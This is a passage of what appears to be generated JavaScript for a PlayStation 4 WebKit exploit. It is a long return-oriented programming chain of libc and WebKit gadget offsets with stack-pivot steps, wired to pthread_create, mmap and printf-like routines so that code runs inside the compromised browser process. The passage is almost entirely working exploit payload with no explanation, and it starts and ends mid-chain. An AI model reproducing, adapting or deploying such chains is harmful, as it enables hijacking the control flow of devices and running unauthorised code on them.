libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
pthread_create_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+158904, //L2348
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2348:
db([0, 0]); // 0x0
//L2121:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
mmap_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160232, //L2349
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2349:
db([0, 0]); // 0x0
//_printf_:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160304, //L2351
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2351:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160368, //L2353
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2353:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160464, //L2354
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+160480, //L2355
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2354:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2355:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160592, //L2356
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+160576, //L2357
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2357:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2356:
db([0, 0]); // 0x0
//__putchar:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160664, //L2359
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2359:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160752, //L2361
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160784, //L2362
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2361:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2360:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L2362:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2363:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+160896, //L2365
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+160880, //L2364
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2364:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2365:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+161032, //L2368
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161000, //L2366
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2366:
db([0, 0]); // 0x0
set_gadgets([
libc_base+206806, //pop rdi
//L2367:
ropchain+136, //_ps4_printf_fd
libc_base+788575 //pop rax
]);
//L2368:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+161200, //L2371
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161216, //L2372
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161184, //L2369
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+161168, //L2370
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2370:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2369:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2371:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2372:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+161288, //L2373
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161304, //L2374
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2373:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2374:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+161408, //L2375
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161440, //L2377
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+161424, //L2376
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2375:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2376:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2377:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+161608, //L2379
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161624, //L2380
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161592, //L2378
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2378:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2379:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2380:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+161728, //L2382
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161776, //L2385
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+161760, //L2384
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2382:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2383:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2384:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2385:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+161888, //L2386+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+161880, //L2386
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2386:
db([0, 0]); // 0x0
set_gadgets([
ropchain+161904, //L2386+24
ropchain+162728, //L2381
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161944, //L2388
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2388:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2387:
db([1, 0]); // 0x1
set_gadget(libc_base+206806,); //pop rdi
//L2389:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+162072, //L2391
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+162056, //L2390
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2390:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2391:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+162168, //L2393
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2392:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2393:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+162312, //L2396
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+162280, //L2394
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2394:
db([0, 0]); // 0x0
set_gadgets([
libc_base+206806, //pop rdi
//L2395:
ropchain+136, //_ps4_printf_fd
libc_base+788575 //pop rax
]);
//L2396:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+162480, //L2399
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+162496, //L2400
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+162464, //L2397
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+162448, //L2398
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2398:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2397:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2399:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2400:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+162592, //L2402
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+162576, //L2401
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2401:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2402:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2404:
ropchain+162696, //L2403
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+165112, //L2405
//L2403:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L2381:
libc_base+793877, //pop rsi
ropchain+162768, //L2406
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2406:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2408:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+162888, //L2411
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+162872, //L2409
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2409:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2411:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+163048, //L2415
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+163000, //L2413
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+163032, //L2414
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2413:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2412:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L2414:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2415:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+163104, //L2417
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2417:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+163208, //L2419
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+163240, //L2420
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163224, //L2418
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2419:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2418:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2420:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163400, //L2424
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+163352, //L2422
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163384, //L2423
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2422:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2421:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L2423:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2424:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+163456, //L2426
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2426:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+163560, //L2428
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+163592, //L2429
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163576, //L2427
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2428:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2427:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2429:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163664, //L2430
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+163680, //L2431
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2430:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2431:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163840, //L2435
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+163792, //L2433
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163824, //L2434
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2433:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2432:
db([24, 0]); // 0x18
set_gadget(libc_base+206806,); //pop rdi
//L2434:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2435:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+163896, //L2437
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2437:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+164000, //L2439
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+164032, //L2440
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+164016, //L2438
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2439:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2438:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2440:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+164128, //L2442
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
